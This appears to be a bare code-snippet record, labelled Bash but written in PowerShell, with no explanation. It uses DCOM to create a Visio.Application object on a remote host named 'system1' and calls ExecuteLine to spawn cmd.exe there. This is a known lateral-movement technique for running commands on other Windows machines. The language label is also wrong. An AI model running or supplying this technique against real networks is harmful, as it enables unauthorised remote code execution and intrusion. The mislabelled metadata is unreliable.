---
id: 1a2c826a-7582-496e-89b3-15b7bfd3db34
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:21:09.547874+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 1a2c826a

**Language**: Bash

```bash

$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("visio.application", "system1"))
$docs = $visio.Documents.Add("")
$docs.ExecuteLine('CreateObject("Wscript.Shell").Exec("cmd.exe")')

```


